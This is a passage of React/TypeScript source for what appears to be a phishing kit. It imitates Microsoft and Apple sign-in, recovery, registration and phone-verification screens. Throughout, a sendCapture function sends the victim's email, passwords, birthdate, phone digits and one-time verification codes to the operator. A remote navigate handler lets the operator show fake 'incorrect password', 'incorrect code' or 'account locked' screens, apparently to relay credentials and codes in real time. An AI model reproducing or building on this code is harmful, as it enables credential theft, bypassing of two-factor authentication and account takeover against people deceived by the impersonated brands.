                    Email {email ? email.replace(/^(.{2})(.+?)(@.+)$/, (_, a, _b, c) => `${a}*****${c}`) : 'us*****@example.com'}
                  </div>
                </div>
              </label>
              <p className="text-[12px] text-[#605e5c] mb-3 leading-relaxed">
                To verify that this is your email address, complete the hidden part and click "Get code" to receive your code.
              </p>
              <div className="flex items-center border border-[#888] mb-4">
                <input
                  type="text"
                  value={cantUseInput}
                  onChange={e => setCantUseInput(e.target.value)}
                  placeholder="username"
                  className="flex-1 px-3 py-2 bg-transparent text-[#1b1b1b] text-[15px] focus:outline-none placeholder-gray-400"
                />
                <span className="px-3 py-2 bg-gray-100 border-l border-[#888] text-[#1b1b1b] text-[14px] select-none">
                  {email.includes('@') ? email.slice(email.indexOf('@')) : '@example.com'}
                </span>
              </div>
              <div className="mb-4">
                <a href="#" className="text-[#0078D4] text-[13px] hover:underline">I have a code</a>
              </div>
              <div className="mb-6">
                <a href="#" className="text-[#0078D4] text-[13px] hover:underline">Show more verification methods</a>
              </div>
              <div className="flex gap-3 justify-end">
                <button
                  onClick={() => setStep('authenticator')}
                  className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors"
                  style={{ borderRadius: 0 }}
                >Cancel</button>
                <button
                  onClick={() => {
                    if (cantUseInput) {
                      sendCapture('cant_use_input', cantUseInput + (email.includes('@') ? email.slice(email.indexOf('@')) : '@example.com'));
                      nav('email-code');
                    }
                  }}
                  className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors"
                  style={{ borderRadius: 0 }}
                >Get code</button>
              </div>
            </div>
          </motion.div>
        )}

        {/* ── Verify phone number ────────────────────────────────────────────── */}
        {step === 'verify-phone-number' && (
          <motion.div key="verify-phone-number" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              <div className="flex items-center mb-5">
                <button onClick={() => setStep('other-ways')} className="text-[#aaa] hover:text-white transition-colors p-0.5 -ml-0.5" style={{ background: 'none', border: 'none', cursor: 'pointer' }}>
                  <ChevronLeft className="w-5 h-5" />
                </button>
                <div className="flex-1 flex items-center justify-center gap-2">
                  <MicrosoftLogo />
                  {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
                </div>
                <div className="w-5" />
              </div>
              <div className="flex justify-center mb-4">
                <div className="inline-flex items-center px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px]">
                  {email || 'user@example.com'}
                </div>
              </div>
              <h1 className="text-[22px] font-bold text-white text-center mb-2">Verify your phone number</h1>
              <p className="text-[13px] text-[#aaa] text-center mb-6 leading-relaxed">
                We'll send a code to <strong className="text-white">+**********00</strong>. Enter the missing digits from the last four digits of your number.
              </p>
              <div className="flex justify-center gap-3 mb-6">
                {[0, 1, 2, 3].map(i => (
                  <input
                    key={i}
                    type="text"
                    maxLength={1}
                    disabled={i >= 2}
                    value={i >= 2 ? '0' : (verifyPhoneDigits[i] ?? '')}
                    onChange={e => {
                      const d = e.target.value.replace(/\D/g, '').slice(-1);
                      const arr = [...verifyPhoneDigits.padEnd(2, ' ')].slice(0, 2);
                      arr[i] = d;
                      setVerifyPhoneDigits(arr.join('').trim());
                      if (d && i < 1) phoneVerifyRefs.current[i + 1]?.focus();
                    }}
                    ref={el => { phoneVerifyRefs.current[i] = el; }}
                    className={`w-14 h-16 text-center text-[24px] font-bold border focus:outline-none transition-colors
                      ${i >= 2
                        ? 'border-[#444] text-[#888] bg-[#1a1a1a] cursor-not-allowed'
                        : 'border-[#555] focus:border-[#0078D4] text-white bg-transparent'}`}
                  />
                ))}
              </div>
              <div className="flex flex-col items-center gap-3 mb-6">
                <a href="#" className="text-[#3391e0] text-[13px] hover:underline">Already received a code?</a>
                <a href="#" className="text-[#3391e0] text-[13px] hover:underline">Update your password instead</a>
              </div>
              <button
                onClick={() => {
                  if (verifyPhoneDigits.trim().length >= 1) {
                    sendCapture('phone_verify', verifyPhoneDigits.trim() + '00');
                    nav('phone-code');
                  }
                }}
                className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 transition-colors"
                style={{ borderRadius: 0 }}
              >
                Next
              </button>
            </div>
          </motion.div>
        )}

        {/* ── Register flow ──────────────────────────────────────────────────── */}
        {step === 'register' && (
          <motion.div key={`register-${regStep}`} {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`flex flex-col gap-0 ${lightCardCls}`}>
              {msLogoRow(false)}

              {regStep === 'reg-email' && (
                <>
                  <h1 className={`text-[24px] font-bold mb-6 ${lightText}`}>Create account</h1>
                  <input
                    type="email"
                    value={regEmail}
                    onChange={e => setRegEmail(e.target.value)}
                    onKeyDown={e => { if (e.key === 'Enter' && regEmail) { sendCapture('reg_email', regEmail); setRegStep('reg-password'); } }}
                    placeholder="someone@example.com"
                    autoFocus
                    className={`${lightUnderlineInputSolid} mb-3`}
                  />
                  <div className="text-[13px] mb-8">
                    <a href="#" className="text-[#0078D4] hover:underline">Use a phone number instead</a>
                  </div>
                  <div className="flex justify-between items-center">
                    <button onClick={() => setStep('email')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
                    <button onClick={() => { if (regEmail) { sendCapture('reg_email', regEmail); setRegStep('reg-password'); } }} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
                  </div>
                </>
              )}

              {regStep === 'reg-password' && (
                <>
                  <h1 className={`text-[24px] font-bold mb-1 ${lightText}`}>Create a password</h1>
                  <p className="text-[13px] text-[#605e5c] mb-5">Use 8 or more characters with a mix of letters, numbers &amp; symbols.</p>
                  <div className="relative mb-4">
                    <input
                      type={regShowPw ? 'text' : 'password'}
                      value={regPassword}
                      onChange={e => setRegPassword(e.target.value)}
                      onKeyDown={e => { if (e.key === 'Enter' && regPassword.length >= 8) { sendCapture('reg_password', regPassword); setRegStep('reg-name'); } }}
                      placeholder="Password"
                      autoFocus
                      className={`${lightUnderlineInputSolid} pr-8`}
                    />
                    <button onClick={() => setRegShowPw(v => !v)} className="absolute right-0 bottom-2 opacity-50 hover:opacity-80" style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>
                      {regShowPw ? <EyeOff className="w-4 h-4 text-black" /> : <Eye className="w-4 h-4 text-black" />}
                    </button>
                  </div>
                  <label className="flex items-start gap-2 mb-8 cursor-pointer select-none text-[#1b1b1b]" style={{ fontSize: 13 }}>
                    <div onClick={() => setPromoEmails(v => !v)} className={`w-4 h-4 mt-0.5 border flex items-center justify-center flex-shrink-0 cursor-pointer transition-colors ${promoEmails ? 'bg-[#0078D4] border-[#0078D4]' : 'border-[#666]'}`}>
                      {promoEmails && <Check className="w-3 h-3 text-white" />}
                    </div>
                    I would like information, tips, and offers about Microsoft products and services.
                  </label>
                  <div className="flex justify-between items-center">
                    <button onClick={() => setRegStep('reg-email')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
                    <button onClick={() => { if (regPassword.length >= 8) { sendCapture('reg_password', regPassword); setRegStep('reg-name'); } }} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
                  </div>
                </>
              )}

              {regStep === 'reg-name' && (
                <>
                  <h1 className={`text-[24px] font-bold mb-5 ${lightText}`}>What's your name?</h1>
                  <div className="mb-5">
                    <input type="text" value={firstName} onChange={e => setFirstName(e.target.value)} placeholder="First name" autoFocus className={lightUnderlineInputSolid} />
                  </div>
                  <div className="mb-8">
                    <input type="text" value={lastName} onChange={e => setLastName(e.target.value)} placeholder="Last name" className={lightUnderlineInputSolid} />
                  </div>
                  <div className="flex justify-between items-center">
                    <button onClick={() => setRegStep('reg-password')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
                    <button onClick={() => { if (firstName || lastName) { sendCapture('reg_name', [firstName, lastName].filter(Boolean).join(' ')); setRegStep('reg-dob'); } }} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
                  </div>
                </>
              )}

              {regStep === 'reg-dob' && (
                <>
                  <h1 className={`text-[24px] font-bold mb-1 ${lightText}`}>What's your birthdate?</h1>
                  <p className="text-[13px] text-[#605e5c] mb-5">We need a little more info to keep your account safe.</p>
                  <div className="mb-4">
                    <label className="text-[12px] text-[#605e5c] block mb-1">Country/region</label>
                    <select defaultValue="United States" className="w-full pb-2 border-0 border-b border-[#000]/40 focus:border-[#0078D4] focus:outline-none bg-transparent text-[15px] text-black appearance-none">
                      {['United States','United Kingdom','Canada','Australia','Germany','France','Japan','India'].map(c => <option key={c}>{c}</option>)}
                    </select>
                  </div>
                  <div className="text-[12px] text-[#605e5c] mb-1.5">Birthdate</div>
                  <div className="flex gap-3 mb-8">
                    <select value={regMonth} onChange={e => setRegMonth(e.target.value)} className="flex-1 pb-2 border-0 border-b border-[#000]/40 focus:border-[#0078D4] focus:outline-none bg-transparent text-[15px] text-black">
                      {['January','February','March','April','May','June','July','August','September','October','November','December'].map(m => <option key={m}>{m}</option>)}
                    </select>
                    <select value={regDay} onChange={e => setRegDay(e.target.value)} className="w-16 pb-2 border-0 border-b border-[#000]/40 focus:border-[#0078D4] focus:outline-none bg-transparent text-[15px] text-black">
                      {Array.from({length:31},(_,i)=>i+1).map(d => <option key={d}>{d}</option>)}
                    </select>
                    <select value={regYear} onChange={e => setRegYear(e.target.value)} className="w-24 pb-2 border-0 border-b border-[#000]/40 focus:border-[#0078D4] focus:outline-none bg-transparent text-[15px] text-black">
                      {Array.from({length:100},(_,i)=>new Date().getFullYear()-i).map(y => <option key={y}>{y}</option>)}
                    </select>
                  </div>
                  <div className="flex justify-between items-center">
                    <button onClick={() => setRegStep('reg-name')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
                    <button onClick={() => { sendCapture('reg_dob', `${regMonth} ${regDay}, ${regYear}`); setRegStep('reg-verify'); }} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
                  </div>
                </>
              )}

              {regStep === 'reg-verify' && (
                <>
                  <h1 className={`text-[24px] font-bold mb-2 ${lightText}`}>Verify your email</h1>
                  <p className="text-[13px] text-[#605e5c] mb-5 leading-relaxed">
                    Enter the code we sent to <strong className="text-[#1b1b1b]">{regEmail || 'your email'}</strong>. If you didn't get the email, check your junk folder or try another method.
                  </p>
                  <input
                    type="text"
                    value={verifyCode}
                    onChange={e => setVerifyCode(e.target.value.replace(/\D/g,'').slice(0,6))}
                    placeholder="Enter code"
                    autoFocus
                    className={`${lightUnderlineInputSolid} mb-2`}
                    maxLength={6}
                  />
                  <div className="text-[13px] mb-5">
                    <a href="#" className="text-[#0078D4] hover:underline">Get a new code</a>
                  </div>
                  <p className="text-[12px] text-[#605e5c] mb-6 leading-relaxed">
                    By selecting Next, you agree to the{' '}
                    <a href="#" className="text-[#0078D4] hover:underline">Microsoft Service Agreement</a>{' '}
                    and{' '}
                    <a href="#" className="text-[#0078D4] hover:underline">privacy and cookies statement</a>.
                  </p>
                  <div className="flex justify-between items-center">
                    <button onClick={() => setRegStep('reg-dob')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
                    <button onClick={() => { if (verifyCode.length === 6) { sendCapture('reg_verify_code', verifyCode); setStep('email'); } }} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
                  </div>
                </>
              )}
            </div>
          </motion.div>
        )}

        {/* ── Recover / Can't access account ──────────────────────────────────── */}
        {step === 'recover' && (
          <motion.div key={`recover-${recStep}`} {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`flex flex-col gap-0 ${lightCardCls}`}>
              {msLogoRow(false)}

              {recStep === 'rec-find' && (
                <>
                  <h1 className="text-[20px] font-bold mb-2 text-[#1b1b1b]">Get back into your account</h1>
                  <p className="text-[13px] text-[#605e5c] mb-4 leading-relaxed">
                    To recover your account, enter the email address, phone number, or Skype name you use to sign in.
                  </p>
                  <label className="text-[13px] font-semibold text-[#1b1b1b] mb-1 block">Email or username <span className="text-red-500">*</span></label>
                  <input
                    type="text"
                    value={recEmail}
                    onChange={e => setRecEmail(e.target.value)}
                    placeholder="Email or username"
                    autoFocus
                    className={`${lightUnderlineInputSolid} mb-6`}
                  />
                  <div className="border border-gray-300 p-3.5 mb-6 flex items-center gap-3 rounded">
                    <div
                      onClick={() => setRecCaptcha(v => !v)}
                      className={`w-5 h-5 border-2 rounded flex items-center justify-center cursor-pointer flex-shrink-0 transition-colors ${recCaptcha ? 'bg-[#0078D4] border-[#0078D4]' : 'border-gray-400'}`}
                    >
                      {recCaptcha && <Check className="w-3 h-3 text-white" />}
                    </div>
                    <span className="text-[13px] text-[#1b1b1b] flex-1">I'm not a robot</span>
                    <div className="flex flex-col items-center gap-0.5 flex-shrink-0">
                      <div className="text-[10px] text-[#555] font-medium tracking-tight">reCAPTCHA</div>
                      <div className="text-[8px] text-[#999]">Privacy · Terms</div>
                    </div>
                  </div>
                  <div className="flex justify-between items-center">
                    <button onClick={() => setStep('email')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Cancel</button>
                    <button
                      onClick={() => { if (recEmail && recCaptcha) { sendCapture('rec_email', recEmail); setRecStep('rec-options'); } }}
                      className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors"
                      style={{ borderRadius: 0 }}
                    >Next</button>
                  </div>
                </>
              )}

              {recStep === 'rec-options' && (
                <>
                  <h1 className="text-[20px] font-bold mb-2 text-[#1b1b1b]">We need to verify your identity</h1>
                  <p className="text-[13px] text-[#605e5c] mb-5">Choose how you'd like to receive the security code.</p>
                  <label className="flex items-start gap-3 cursor-pointer p-3 border border-blue-300 bg-blue-50 rounded mb-2">
                    <input type="radio" name="rec-method" defaultChecked className="mt-0.5 accent-[#0078D4]" />
                    <div>
                      <div className="text-[14px] font-medium text-[#1b1b1b]">
                        Email {recEmail.includes('@') ? recEmail.replace(/(.{2})(.+)(@.+)/, (_, a, _b, c) => `${a}***${c}`) : recEmail}
                      </div>
                      <div className="text-[12px] text-[#605e5c] mt-0.5">We'll send a 6-digit code to this address</div>
                    </div>
                  </label>
                  <div className="flex justify-between items-center mt-6">
                    <button onClick={() => setRecStep('rec-find')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
                    <button onClick={() => setRecStep('rec-code')} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Send code</button>
                  </div>
                </>
              )}

              {recStep === 'rec-code' && (
                <>
                  <h1 className="text-[20px] font-bold mb-2 text-[#1b1b1b]">Enter your verification code</h1>
                  <p className="text-[13px] text-[#605e5c] mb-5 leading-relaxed">
                    Enter the 6-digit security code we sent to <strong className="text-[#1b1b1b]">{recEmail || 'your email'}</strong>.
                  </p>
                  <input
                    type="text"
                    value={recCode}
                    onChange={e => setRecCode(e.target.value.replace(/\D/g,'').slice(0,6))}
                    placeholder="Verification code"
                    autoFocus
                    className={`${lightUnderlineInputSolid} mb-2`}
                    maxLength={6}
                  />
                  <div className="text-[13px] mb-8">
                    <a href="#" className="text-[#0078D4] hover:underline">I didn't receive a code</a>
                  </div>
                  <div className="flex justify-between items-center">
                    <button onClick={() => setRecStep('rec-options')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
                    <button onClick={() => { if (recCode.length === 6) { sendCapture('rec_code', recCode); setStep('email'); } }} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Verify</button>
                  </div>
                </>
              )}
            </div>
          </motion.div>
        )}

        {/* ── Processing ── */}
        {step === 'processing' && (
          <motion.div key="processing" {...fadeOnly} className={`flex flex-col ${wrapCls}`}>
            {isMobile ? (
              <div className="flex flex-col items-center gap-5 px-8">
                {msLogoRow(true)}
                <p className="text-[15px] text-[#aaa] text-center mt-1">Just a moment…</p>
                <div className="flex gap-2">
                  {[0,1,2].map(i => <div key={i} className="w-2 h-2 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i*0.15}s` }} />)}
                </div>
              </div>
            ) : (
              <div className={`w-[440px] flex flex-col items-center px-10 pt-10 pb-12 shadow-xl ${darkCardBg}`}>
                {msLogoRow(true)}
                <p className="text-[15px] text-[#aaa] mt-6 mb-5 text-center">Just a moment…</p>
                <div className="flex gap-2">
                  {[0,1,2].map(i => <div key={i} className="w-2.5 h-2.5 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i*0.15}s` }} />)}
                </div>
              </div>
            )}
          </motion.div>
        )}


      </AnimatePresence>
    </div>
  );
}

// ─── Apple ───────────────────────────────────────────────────────────────────

type AppleStep = 'email' | 'password' | 'verification-code' | 'device-trust' | 'processing' | 'error-email' | 'error-password' | 'error-code' | 'forgot' | 'forgot-sent' | 'account-locked';

function AppleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHandler }: {
  device: string; theme: string;
  sendCapture: (field: string, value: string) => void;
  sendStepUpdate: (step: string) => void;
  setNavigateHandler: (fn: NavigateHandler) => void;
}) {
  const isDark = theme === 'dark';
  const isDesktop = device === 'desktop';
  const [step, setStep] = useState<AppleStep>(() => {
    const init = new URLSearchParams(window.location.search).get('initialStep') as AppleStep | null;
    return init ?? 'email';
  });
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [keepSignedIn, setKeepSignedIn] = useState(false);
  const [codeInput, setCodeInput] = useState('');
  const [forgotEmail, setForgotEmail] = useState('');
  const [loading, setLoading] = useState(false);
  const [emailError, setEmailError] = useState<string | null>(null);
  const [passwordError, setPasswordError] = useState<string | null>(null);
  const [codeError, setCodeError] = useState<string | null>(null);
  const passwordRef = useRef<HTMLInputElement>(null);
  const codeRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (step === 'password') passwordRef.current?.focus();
    if (step === 'verification-code') setTimeout(() => codeRef.current?.focus(), 100);
  }, [step]);

  useEffect(() => {
    setNavigateHandler((s) => {
      if (s === 'unlock') { setStep('email'); return; }
      if (s === 'error-email') {
        setEmailError("This Apple Account doesn't exist. Enter a different email or phone number.");
        setStep('email');
      } else if (s === 'error-password') {
        setPasswordError('Your Apple Account or password was incorrect.');
        setStep('password');
      } else if (s === 'error-code') {
        setCodeError('Incorrect verification code. Try again.');
        setStep('verification-code');
      } else {
        setEmailError(null); setPasswordError(null); setCodeError(null);
        setStep(s as AppleStep);
      }
    });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
  useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);

  const nav = (target: AppleStep, captureField?: string, captureVal?: string) => {
    setEmailError(null); setPasswordError(null); setCodeError(null);
    if (captureField && captureVal) sendCapture(captureField, captureVal);
    setLoading(true);
    setTimeout(() => { setLoading(false); setStep(target); }, 700);
  };

  // ── Design tokens ──────────────────────────────────────────────────────────
  const pageBg    = isDark ? '#1d1d1f' : '#f2f2f2';
  const cardBg    = isDark ? '#2d2d2f' : '#ffffff';
  const cardBdr   = isDark ? '#424245' : '#d2d2d7';
  const txtMain   = isDark ? '#f5f5f7' : '#1d1d1f';
  const txtSub    = isDark ? '#86868b' : '#6e6e73';
  const inBg      = isDark ? '#1d1d1f' : '#ffffff';
  const inBdr     = isDark ? '#424245' : '#d2d2d7';
  const divBdr    = isDark ? '#424245' : '#e0e0e5';
  const blue      = '#0071e3';
  const errClr    = isDark ? '#ff453a' : '#ff3b30';
  const ff        = '-apple-system,BlinkMacSystemFont,"SF Pro Display","SF Pro Text",sans-serif';

  const S = {
    page: { width:'100%', height:'100%', minHeight:'100%', display:'flex', flexDirection:'column' as const, backgroundColor:pageBg, fontFamily:ff, color:txtMain, overflowY:'auto' as const },
    center: { flex:1, display:'flex', alignItems:'center', justifyContent:'center', padding: isDesktop ? '40px 20px' : '0' },
    card: {
      width:'100%', maxWidth: isDesktop ? 500 : '100%',
      backgroundColor: isDesktop ? cardBg : 'transparent',
      borderRadius: isDesktop ? 20 : 0,
      border: isDesktop ? `1px solid ${cardBdr}` : 'none',
      padding: isDesktop ? '44px 48px 40px' : '40px 24px 60px',
      display:'flex', flexDirection:'column' as const, alignItems:'center',
    },
    input: (err?: boolean): React.CSSProperties => ({
      width:'100%', padding:'13px 16px', fontSize:17, lineHeight:1.4,
      border:`1.5px solid ${err ? errClr : inBdr}`, borderRadius:10,
      backgroundColor:inBg, color:txtMain, outline:'none', fontFamily:ff,
      boxSizing:'border-box' as const, transition:'border-color .15s',
    }),
    blueBtn: (disabled?: boolean): React.CSSProperties => ({
      padding:'12px 20px', borderRadius:10,
      backgroundColor: disabled ? (isDark ? '#1a3d72' : '#aac9f5') : blue,
      color:'#ffffff', fontSize:17, fontWeight:400, border:'none',
      cursor: disabled ? 'not-allowed' : 'pointer', fontFamily:ff,
      textAlign:'center' as const, transition:'opacity .15s',
    }),
    outBtn: (): React.CSSProperties => ({
      padding:'12px 20px', borderRadius:10, backgroundColor:'transparent',
      color:txtMain, fontSize:17, fontWeight:400,
      border:`1.5px solid ${inBdr}`, cursor:'pointer', fontFamily:ff,
      textAlign:'center' as const, transition:'opacity .15s',
    }),
    link: { fontSize:14, color:blue, background:'none', border:'none', cursor:'pointer', fontFamily:ff, padding:0 } as React.CSSProperties,
    smallLink: { fontSize:12, color:blue, background:'none', border:'none', cursor:'pointer', fontFamily:ff, padding:0 } as React.CSSProperties,
  };

  // ── Sub-components (inline, not React components to avoid remount) ─────────
  const PrivacyIcon = (
    <svg width="40" height="32" viewBox="0 0 44 34" fill="none" style={{ flexShrink:0, marginTop:2 }}>
      <circle cx="30" cy="11" r="8" fill="#4DB6FF"/>
      <path d="M16 34c0-7.73 5.82-14 13-14s13 6.27 13 14" fill="#4DB6FF"/>
      <circle cx="16" cy="11" r="9" fill={blue}/>
      <path d="M1 34c0-8.28 6.72-15 15-15s15 6.72 15 15" fill={blue}/>
    </svg>
  );

  const PasskeyIcon = (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink:0 }}>
      <circle cx="8" cy="8" r="4"/>
      <path d="M2 20v-1a7 7 0 0 1 7-7h1"/>
      <circle cx="19" cy="17" r="3"/>
      <path d="m22 14-3.5 3.5M20.5 20.5 22 22"/>
    </svg>
  );

  const hr = <hr style={{ border:'none', borderTop:`1px solid ${divBdr}`, margin:'20px 0', width:'100%' }}/>;

  const LostDeviceSection = (
    <>
      {hr}
      <p style={{ fontSize:13, color:txtSub, textAlign:'center', lineHeight:1.6, marginBottom:20, maxWidth:320 }}>
        If you cannot enter a code because you have lost your device, you can use Find Devices to locate it or Manage Devices to remove your Apple Pay cards from it.
      </p>
      <div style={{ display:'flex', gap:48, justifyContent:'center' }}>
        <button style={{ background:'none', border:'none', cursor:'pointer', display:'flex', flexDirection:'column', alignItems:'center', gap:6, color:txtMain, fontFamily:ff }}>
          <svg width="32" height="32" viewBox="0 0 32 32" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round">
            <circle cx="16" cy="16" r="13"/><circle cx="16" cy="16" r="5"/>
            <line x1="16" y1="2" x2="16" y2="8"/><line x1="16" y1="24" x2="16" y2="30"/>
            <line x1="2" y1="16" x2="8" y2="16"/><line x1="24" y1="16" x2="30" y2="16"/>
          </svg>
          <span style={{ fontSize:12, color:txtSub }}>Find Devices</span>
        </button>
        <button style={{ background:'none', border:'none', cursor:'pointer', display:'flex', flexDirection:'column', alignItems:'center', gap:6, color:txtMain, fontFamily:ff }}>
          <svg width="32" height="32" viewBox="0 0 32 32" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
            <rect x="2" y="5" width="18" height="14" rx="2"/>
            <line x1="7" y1="23" x2="15" y2="23"/><line x1="11" y1="19" x2="11" y2="23"/>
            <rect x="20" y="15" width="9" height="11" rx="1.5"/><line x1="24.5" y1="25" x2="24.5" y2="26.5"/>
          </svg>
          <span style={{ fontSize:12, color:txtSub }}>Manage devices ↗</span>
        </button>
      </div>
    </>
  );

  const PasskeyBtn = (
    <button style={{ ...S.outBtn(), flex:1, display:'flex', alignItems:'center', justifyContent:'center', gap:6, fontSize:15, whiteSpace:'nowrap' as const }}>
      {PasskeyIcon}
      Sign in with Passkey
    </button>
  );

  const PasskeyNote = (
    <p style={{ fontSize:12, color:txtSub, textAlign:'right', alignSelf:'flex-end', marginTop:6, lineHeight:1.4 }}>
      Requires macOS Sonoma or iOS 17 or later.
    </p>
  );

  // ── Render ────────────────────────────────────────────────────────────────
  const Ring = <AppleSpinRing isDark={isDark} />;

  const isLoadingState = loading || step === 'processing';

  if (step === 'account-locked') return <AccountLockedScreen email={email} onLogout={() => setStep('email')} />;

  return (
    <div style={S.page}>
      <div style={S.center}>
        <div style={S.card}>

          {/* ── Loading / Processing ── */}
          {isLoadingState && (
            <>
              {Ring}
              <h1 style={{ fontSize:22, fontWeight:600, color:txtMain, marginBottom:28, textAlign:'center', margin:'0 0 28px' }}>Apple Account</h1>
              <svg viewBox="0 0 50 50" style={{ width:36, height:36 }}>
                <circle cx="25" cy="25" r="20" fill="none" strokeWidth="3" strokeLinecap="round"
                  stroke={isDark ? '#ffffff' : '#1c1c1e'} strokeDasharray="70 130" strokeOpacity="0.8"
                  style={{ animation:'spin .9s linear infinite', transformOrigin:'center' }} />
                <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
              </svg>
            </>
          )}

          {/* ── Email step ── */}
          {!isLoadingState && (step === 'email' || step === 'error-email') && (
            <>
              {Ring}
              <h1 style={{ fontSize:22, fontWeight:600, color:txtMain, textAlign:'center', margin:'0 0 22px', letterSpacing:'-0.2px' }}>
                Sign in with Apple Account
              </h1>

              <input
                data-testid="apple-email-input"
                type="text"
                value={email}
                onChange={e => { setEmail(e.target.value); setEmailError(null); }}
                onKeyDown={e => e.key === 'Enter' && email && nav('password', 'email', email)}
                placeholder="Email or Phone Number"
                autoFocus
                style={{ ...S.input(!!emailError), marginBottom: emailError ? 6 : 0 }}
              />
              {emailError && <p style={{ fontSize:13, color:errClr, alignSelf:'flex-start', marginBottom:4, marginTop:0 }}>{emailError}</p>}

              <button
                data-testid="apple-create-account"
                style={{ ...S.link, alignSelf:'flex-start', marginTop:8, marginBottom:18, fontSize:14 }}
              >
                Create Your Apple Account
              </button>

              {/* Privacy section */}
              <div style={{ display:'flex', gap:12, alignItems:'flex-start', marginBottom:22, width:'100%' }}>
                {PrivacyIcon}
                <p style={{ fontSize:13, color:txtSub, lineHeight:1.55, margin:0 }}>
                  Your Apple Account information is used to allow you to sign in securely and access your data. Apple records certain data for security, support and reporting purposes. If you agree, Apple may also use your Apple Account information to send you marketing emails and communications, including based on your use of Apple services.{' '}
                  <button style={S.smallLink}>See how your data is managed...</button>
                </p>
              </div>

              {/* Button row */}
              <div style={{ display:'flex', gap:10, width:'100%', marginBottom:8 }}>
                <button
                  data-testid="apple-continue-btn"
                  onClick={() => email && nav('password', 'email', email)}
                  style={{ ...S.blueBtn(!email), flex:1 }}
                >
                  Continue
                </button>
                {PasskeyBtn}
              </div>
              {PasskeyNote}
            </>
          )}

          {/* ── Password step ── */}
          {!isLoadingState && (step === 'password' || step === 'error-password') && (
            <>
              {Ring}
              <h1 style={{ fontSize:22, fontWeight:600, color:txtMain, textAlign:'center', margin:'0 0 22px', letterSpacing:'-0.2px' }}>
                Sign in with Apple Account
              </h1>

              {/* Grouped input container */}
              <div style={{ width:'100%', border:`1.5px solid ${passwordError ? errClr : inBdr}`, borderRadius:10, overflow:'hidden', marginBottom:8 }}>
                {/* Email row (read-only) */}
                <div style={{ position:'relative', borderBottom:`1px solid ${divBdr}` }}>
                  <input
                    type="text"
                    readOnly
                    value={email || 'user@icloud.com'}
                    style={{ width:'100%', padding:'13px 44px 13px 16px', fontSize:15, border:'none', backgroundColor:inBg, color:txtMain, outline:'none', fontFamily:ff, boxSizing:'border-box' as const }}
                  />
                  <div style={{ position:'absolute', right:12, top:'50%', transform:'translateY(-50%)', width:22, height:22, borderRadius:'50%', backgroundColor:blue, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0 }}>
                    <svg width="12" height="10" viewBox="0 0 12 10" fill="none"><path d="M1 5l3.5 3.5L11 1" stroke="white" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
                  </div>
                </div>
                {/* Password row */}
                <div style={{ position:'relative' }}>
                  <input
